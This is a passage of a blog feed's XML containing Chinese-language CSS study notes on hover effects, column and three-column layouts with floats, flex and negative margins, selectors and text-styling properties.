img&#123;</span><br><span class="line">    width: auto;</span><br><span class="line">    height: auto;</span><br><span class="line">    position: relative;</span><br><span class="line">    top:3px;</span><br><span class="line">    left: 2px;</span><br><span class="line">    cursor: pointer;  /*悬停变成小手*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;search&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;search-box&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;m-search&quot; placeholder=&quot;Search&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;image/Search icon.png&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="给图片加悬浮阴影效果"><a href="#给图片加悬浮阴影效果" class="headerlink" title="给图片加悬浮阴影效果"></a>给图片加悬浮阴影效果</h2><p><img src="http://static.zybuluo.com/Passer6y/aj81y4td1xw6dkbqxkoyzim6/image_1d1vlr1c4dh916qj1h7tguvmg3m.png" alt="image_1d1vlr1c4dh916qj1h7tguvmg3m.png-73.4kB"></p><p>两个图片放入同一个父盒子，将hover效果图利用定位，定位到和初始图一个位置，设好hover效果图初始为不可见，然后用<code>:hover</code>改变透明度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.team-name&#123;</span><br><span class="line">    margin: 10px 10px;</span><br><span class="line">    position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.team-name .cover&#123;</span><br><span class="line">    opacity: 0;  /*将覆盖的图设为不可见*/</span><br><span class="line">    position: absolute;   /*将覆盖图和原始图定位到同一个位置*/</span><br><span class="line">    top: 0;</span><br><span class="line">    bottom: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    z-index: 1;</span><br><span class="line">&#125;</span><br><span class="line">.team-name:hover .cover&#123;</span><br><span class="line">    opacity: 0.9;   </span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;team-name&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;images/Userpic-1.jpg&quot; alt=&quot;&quot;&gt;&lt;!--初始图--&gt;</span><br><span class="line">    &lt;div&gt;&lt;img class=&quot;cover&quot; src=&quot;images/active.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;!--hover后覆盖的图--&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>完整效果：<br>悬浮阴影效果.gif<img src="http://static.zybuluo.com/Passer6y/praniz3d8yq8oyia3l6zkdtk/image_1d1vlp4881ulh169gvg51t5o1o189.png" alt="image_1d1vlp4881ulh169gvg51t5o1o189.png-132.8kB"></p><h2 id="实现边线上加文字效果"><a href="#实现边线上加文字效果" class="headerlink" title="实现边线上加文字效果"></a>实现边线上加文字效果</h2><p><img src="http://static.zybuluo.com/Passer6y/vvdjst8rivr4xr591gn3eu03/image_1d2alqq46bod1t5a1s3a1kq9c2m.png" alt="image_1d2alqq46bod1t5a1s3a1kq9c2m.png-4kB"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.line&#123;</span><br><span class="line">        height: 1px;</span><br><span class="line">        text-align: center;  /*让span中间文字到中间*/</span><br><span class="line">        border: 1px solid #ccc;</span><br><span class="line">    &#125;</span><br><span class="line">.line span&#123;</span><br><span class="line">        position: relative;</span><br><span class="line">        top: -12px;         /*移动到线上*/</span><br><span class="line">        font-size: 14px;</span><br><span class="line">        color: #7f8fa4;</span><br><span class="line">        background: white;</span><br><span class="line">        padding: 0 20px;</span><br><span class="line">    &#125;</span><br><span class="line"> &lt;div class=&quot;line&quot;&gt;&lt;span&gt;↑ 安全客推送 ↑&lt;/span&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="在元素盒子前加上小光点"><a href="#在元素盒子前加上小光点" class="headerlink" title="在元素盒子前加上小光点"></a>在元素盒子前加上小光点</h2><p>使用::before伪元素，使用负的left移到盒子前面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.choose::before&#123;</span><br><span class="line">    content: &quot;&quot;;</span><br><span class="line">    position: absolute;</span><br><span class="line">    border-radius: 100px;</span><br><span class="line">    display: block;</span><br><span class="line">    box-shadow: 1px 0 5px 2px #214e74;</span><br><span class="line">    width: 2px;</span><br><span class="line">    height: 4px;</span><br><span class="line">    background-color: #2399f1;</span><br><span class="line">    top: 60px;</span><br><span class="line">    left: -29px;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/kfd9y462ydnkh67una4j0rnf/image_1d27dmc2u93e1na31d9t1iolcn19.png" alt="image_1d27dmc2u93e1na31d9t1iolcn19.png-10.8kB"></p><h2 id="左右两栏固定布局方法"><a href="#左右两栏固定布局方法" class="headerlink" title="左右两栏固定布局方法"></a>左右两栏固定布局方法</h2><ol><li><p>使用float布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    .left-float&#123;</span><br><span class="line">        float: left;</span><br><span class="line">        width: 30%;</span><br><span class="line">        height: 100px;</span><br><span class="line">        background: rgb(17, 0, 255);</span><br><span class="line">    &#125;</span><br><span class="line">    .right-float&#123;</span><br><span class="line">        float:right;</span><br><span class="line">        width: 70%;</span><br><span class="line">        height: 100px;</span><br><span class="line">        background: rgb(77, 209, 77);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;div class=&quot;left-float&quot;&gt;left-float/div&gt;</span><br><span class="line">&lt;div class=&quot;right-float&quot;&gt;right-float&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用flex进行布局(好用！)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.flex&#123;</span><br><span class="line">    display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.left-flex&#123;</span><br><span class="line">    flex:3;</span><br><span class="line">    background:hotpink</span><br><span class="line">&#125;</span><br><span class="line">.right-flex&#123;</span><br><span class="line">    flex:7;</span><br><span class="line">    background:khaki;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;flex&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用绝对定位布局(不推荐)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.left-position&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    top: 100px;</span><br><span class="line">    left: 0;</span><br><span class="line">    width: 30%;</span><br><span class="line">    background:rgb(0, 140, 255);</span><br><span class="line">&#125;</span><br><span class="line">.right-position&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    right: 0;</span><br><span class="line">    top: 100px;</span><br><span class="line">    width:70%;</span><br><span class="line">    background: rgb(202, 127, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;left-position&quot;&gt;left-position&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right-position&quot;&gt;right-position&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="左固定右动态的两列布局"><a href="#左固定右动态的两列布局" class="headerlink" title="左固定右动态的两列布局"></a>左固定右动态的两列布局</h2><ol><li>float+BFC方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.left-float&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width:200px;</span><br><span class="line">    height: 500px;</span><br><span class="line">    color: black;</span><br><span class="line">    background: rgb(228, 139, 23);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.right-float&#123;</span><br><span class="line">    background: red;</span><br><span class="line">    height: 500px;  </span><br><span class="line">    margin-left: 205px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;left-float&quot;&gt;left&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right-float&quot;&gt;right&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://static.zybuluo.com/Passer6y/0uyx9kinkbftwwi31lfxp5mj/image_1d1io2sksu1q1pom1dnk1mmo14ci9.png" alt="image_1d1io2sksu1q1pom1dnk1mmo14ci9.png-4.3kB"></p><ol start="2"><li><p>absolute + margin-left</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    .left-absolute&#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 500px;</span><br><span class="line">        left:0;</span><br><span class="line">        background: rgb(255, 187, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    .right-absolute&#123;</span><br><span class="line">        margin-left: 205px;</span><br><span class="line">        height: 500px;</span><br><span class="line">        background: red;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;div class=&quot;left-absolute&quot;&gt;left-absolute&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right-absolute&quot;&gt;right-absolute&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>flex(好用！)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.left-flex&#123;</span><br><span class="line">    flex: 0 0 200px;</span><br><span class="line">    background: red;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">.right-flex&#123;</span><br><span class="line">    flex: 1 1 auto;</span><br><span class="line">    background: green;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;flex&quot;&gt; </span><br><span class="line">    &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><p><code>flex: 0 0 200px</code>：表示值为固定200px，不和其他元素成比例关系，同时宽度不够时也不会收缩，即固定。</p><h2 id="margin-为负值的用法"><a href="#margin-为负值的用法" class="headerlink" title="margin 为负值的用法"></a>margin 为负值的用法</h2><p><img src="http://static.zybuluo.com/Passer6y/std68hkyagic8vdpqp0vzk9o/image_1d1hvl9ne17i410q2ln19e213ls9.png" alt="image_1d1hvl9ne17i410q2ln19e213ls9.png-64kB"></p><p>margin的参考线有两类，一类是top、left，它们以外元素作为参考线，另一类是right、bottom，它们以自身作为参考线。<br>简单点说就是：</p><ul><li>top负值就是以包含块(Containing block) 内容区域的上边或者上方相连元素 margin 的下边为参考线;</li><li>left负值就是以包含块(Containing block) 内容区域的左边或者左方相连元素 margin 的右边为参考线;</li><li>right负值就是以元素本身border的右边为参考线；</li><li>bottom负值就是以元素本身border的下边为参考线；</li></ul><h2 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h2><p>即三栏布局，两边盒子固定，中间盒子自适应的布局<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>这样写dom，浏览器加载顺序依次为：主列、子列、附加列。<br>但是我们要的效果是左边为子列，中间为主列，右边为附加列。<br><img src="http://static.zybuluo.com/Passer6y/24pk8aju7c2dpgmu1ghhtrno/image_1d1i28aps1l9q186h1g741b54es9m.png" alt="image_1d1i28aps1l9q186h1g741b54es9m.png-112.1kB"></p><p>而且我们要的效果是左右两边盒子宽度固定，中间自适应(width:100%)，缩放页面时宽度不小于700px(给body加个最小宽度)</p><p>这里可以使用margin为负的布局，使得主列在中间，子列和附加列在左右。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.col-main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 100%;</span><br><span class="line">    background:red;</span><br><span class="line">&#125;</span><br><span class="line">.col-sub&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -100%;</span><br><span class="line">    background:green;</span><br><span class="line">&#125;</span><br><span class="line">.col-extra&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -190px;</span><br><span class="line">    background: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">　　&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;</span><br><span class="line">　　&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;</span><br><span class="line">　&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/zfdfulgmoyu11uy83vfr934w/image_1d1i2jjb34to4bgp7117817h813.png" alt="image_1d1i2jjb34to4bgp7117817h813.png-5.8kB"></p><p>初步的布局已经成形了，但是主列的文字被子列挡住了，这时候可能会想着在主列的css上加<code>margin-left</code>，因为我们子列的布局是靠着主列的右边线定位的，直接加的话会影响到整体布局，这里有几种实现办法：</p><ol><li>在主列内建一个盒子，设置该盒子的<code>margin-left/right</code><br>demo:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width:100%;</span><br><span class="line">    height: 600px;;</span><br><span class="line">    background: rgb(16, 149, 202);</span><br><span class="line">&#125;</span><br><span class="line">.left&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    margin-left: -100%;</span><br><span class="line">    width: 200px;</span><br><span class="line">    height: 600px;</span><br><span class="line">    background: rgb(130, 47, 214);</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 200px;</span><br><span class="line">    margin-left: -200px;</span><br><span class="line">    height: 600px;</span><br><span class="line">    background: rgb(255, 217, 0);</span><br><span class="line">&#125;</span><br><span class="line">.wrap&#123;</span><br><span class="line">    margin: 0 200px;</span><br><span class="line">&#125;</span><br><span class="line">body&#123;</span><br><span class="line">    min-width: 700px;  /*设置最小宽度*/</span><br><span class="line">&#125;</span><br><span class="line">&lt;!-- 使用相对定位来解决中间盒子显示问题 --&gt;</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;wrap&quot;&gt;main&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://static.zybuluo.com/Passer6y/2kyahtqnxrbrqwedrm9te9es/image_1d1j5fo081efj1c8ahv21nugpck9.png" alt="image_1d1j5fo081efj1c8ahv21nugpck9.png-5kB"></p><ol start="2"><li>使用相对定位<br>先给三列的父容器设置一个左右200px的padding，将三列压扁，然后给左右列设一个相对定位padding空出来的位置填满。即可让主列元素全部显示出来。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.col-main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 100%;</span><br><span class="line">    background:red;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.col-sub&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -100%;</span><br><span class="line">    background:green;</span><br><span class="line">    position: relative;</span><br><span class="line">    left: -200px;</span><br><span class="line">&#125;</span><br><span class="line">.col-extra&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 190px;</span><br><span class="line">    margin-left: -190px;</span><br><span class="line">    background: blue;</span><br><span class="line">    position: relative;</span><br><span class="line">    right:-200px;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.demo&#123;</span><br><span class="line">    padding: 0 200px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">　　&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;</span><br><span class="line">　　&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;</span><br><span class="line">　&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/Passer6y/lgbo2ojbj1rxjx1ms3y0givv/image_1d1i52mmrbte9f281q1fqok5d2d.png" alt="image_1d1i52mmrbte9f281q1fqok5d2d.png-7kB"></p><h2 id="三栏布局"><a href="#三栏布局" class="headerlink" title="三栏布局"></a>三栏布局</h2><ol><li>上述说的双飞翼(margin负值法)布局</li><li><p>绝对定位法<br>左右宽度固定，采用绝对定位，中间主体用margin撑开。<br>不好用。</p></li><li><p>自身浮动法<br>左右标签，分别左右浮动，主列标签放最后实现自适应。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">html,body&#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    margin: 0;</span><br><span class="line">&#125;</span><br><span class="line">.left&#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100%;</span><br><span class="line">    float: left;</span><br><span class="line">    background:rgb(223, 85, 21);</span><br><span class="line">&#125;</span><br><span class="line">.middle&#123;</span><br><span class="line">    background:rgb(28, 113, 211);</span><br><span class="line">    height: 100%;</span><br><span class="line">    margin: 0 120px;</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100%;</span><br><span class="line">    float: right;</span><br><span class="line">    background: rgb(27, 156, 81);</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;middle&quot;&gt;middle(这个一定要放最后)&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上一篇文章，学习css中踩的坑，一些小的知识点汇总，wiki的前端设计也总算是可以告一段落了，效果图：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="http://passer6y.fun/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>CSS-前端学习记录</title>
    <link href="http://passer6y.fun/2019/01/29/CSS-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://passer6y.fun/2019/01/29/CSS-前端学习记录/</id>
    <published>2019-01-29T12:22:00.000Z</published>
    <updated>2019-01-29T12:32:20.909Z</updated>
    
    <content type="html"><![CDATA[<p>想个小组wiki写个炫酷的前端，这半个月来一直在不断的练习前端开发，分享一些自己学习过程的记录~<br><a id="more"></a></p><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><ol><li><p>标签选择器<br><code>p{font-size: 12px}</code></p></li><li><p>类选择器<br><code>.class{font-size: 12px}</code><br>绑定标签的class属性，可以重复</p></li><li><p>ID选择器<br><code>#id{font-size: 12px}</code><br>绑定标签的id属性，不能重复</p></li><li><p>子选择器<br><code>.food&gt;li{border:1px}</code><br>选择food类中的li标签，只能选择直接后代(第一代后代)</p></li><li><p>包含后代选择器<br><code>.first span{color:red}</code><br>即选择first类里的span标签，所有后代都可以</p></li><li><p>通用选择器<br><code>* {color: red;}</code></p></li><li>伪选择器<br><code>a:hover{color:red;}</code><br>即鼠标滑过时触发的选择器，这里使a标签里的文字变红</li><li><p>分组选择器<br><code>h1,span{color: red}</code><br>选住全部h1和span标签</p></li><li><p>相邻选择器<br><code>div+p</code> 选择紧着在<code>&lt;div&gt;</code>元素后的<code>&lt;p&gt;</code></p></li></ol><blockquote><p>注意和包含后代选择器/子选择器的区别为，它们选择的是包含在其中的元素，而+号选择器选择的是同级别关系的</p></blockquote><ol start="10"><li>通用选择器<br><code>A ~ B</code>:匹配B元素，B是A之后兄弟节点中任意一个。</li></ol><h2 id="文本样式："><a href="#文本样式：" class="headerlink" title="文本样式："></a>文本样式：</h2><ol><li>字体<br><code>font-family: &quot;宋体&quot;;</code><br><code>font-family:&quot;Microsoft Yahei&quot;;</code></li><li>字号<br><code>font-size: 12px</code><br>字体大小单位有：</li></ol><ul><li><code>px</code>：像素值，绝对单位</li><li><code>em</code>：1em相当于当前元素的父元素的大小</li><li><code>rem</code>: 1rem相对于根元素(<html>)的字体大小</html></li></ul><p>所以一般我们将<code>&lt;html&gt;</code>元素的<code>font-size</code>设为一个固定的px值，之后的段落基于rem来变化即可。</p><p>3.颜色<br><code>color: red</code></p><ol start="4"><li>粗体大小<br><code>font-weight: normal | bold | lighter | border</code></li></ol><ul><li>normal: 普通</li><li>bold: 加粗</li><li>更细或更粗</li></ul><ol start="5"><li>字体样式<br><code>font-style: normal | italic | oblique</code></li></ol><ul><li>normal: 设置为普通字体(若存在斜体则关闭)</li><li>italic: 设置斜体</li></ul><ol start="6"><li>文本装饰<br><code>text-decoration:line-through</code><br>参数：<br>none    默认。定义标准的文本。<br>underline    定义文本下的一条线。<br>overline    定义文本上的一条线。<br>line-through    定义穿过文本下的一条线。<br>blink    定义闪烁的文本。<br>inherit    规定应该从父元素继承 text-decoration 属性的值。</li></ol><p>demo：同时添加上下划线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-decoration: underline overline;</span><br></pre></td></tr></table></figure></p><ol start="8"><li>字体转换<br><code>text-transform: none | uppercase | lowercase | capitalize | full-width</code></li></ol><ul><li>none: 防止任何转型。</li><li>uppercase: 将所有文本转为大写。</li><li>lowercase: 将所有文本转为小写。</li><li>capitalize: 转换所有单词让其首字母大写。</li><li>full-width: 将所有字形转换成固定宽度的正方形，类似于等宽字体，允许对齐。拉丁字符以及亚洲语言字形（如中文，日文，韩文）</li></ul><ol start="9"><li><p>嵌入字体<br>加载服务端的字体文件，让浏览器可以显示用户电脑没有的字体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">    font-family : 字体名称;</span><br><span class="line">    src : 字体文件在服务器上的相对或绝对路径;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>文本阴影<br><code>text-shadow: X-Offset Y-Offset blur color;</code><br>X-Offset：表示阴影的水平偏移距离，其值为正值时阴影向右偏移，反之向左偏移；      </p></li></ol><p>Y-Offset：是指阴影的垂直偏移距离，如果其值是正值时，阴影向下偏移，反之向上偏移；</p><p>Blur：是指阴影的模糊程度，其值不能是负值，如果值越大，阴影越模糊，反之阴影越清晰，如果不需要阴影模糊可以将Blur值设置为0；</p><p>Color：是指阴影的颜色，其可以使用rgba色。<br>demo: <code>text-shadow: 2px 2px 0 red</code></p><ol start="11"><li>文本对齐<br><code>text-align: left | right | center | justify</code><br>分别为：左对齐文本 | 右对齐 | 居中 | 使文本展开，使行宽相同</li></ol><ol start="12"><li><p>行距<br><code>line-height: 1.5</code><br>支持大多数单位，也可以无单位，作为乘数，乘以font-size。<br>一般设置为盒子模型的height值，可以起到垂直居中作用。</p></li><li><p>单词和字母间距<br><code>letter-spacing:</code><br><code>word-spacing:</code></p></li><li><p>缩进<br><code>text-indent:2em</code><br>给段落开头缩进2em，即两个文字的空白</p></li><li>行间距<br><code>line-height: 1.5em</code></li><li>字间距<br><code>letter-spacing: 50px</code></li><li>(段落)对齐<br><code>text-align: center</code></li></ol><p><strong>缩写：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 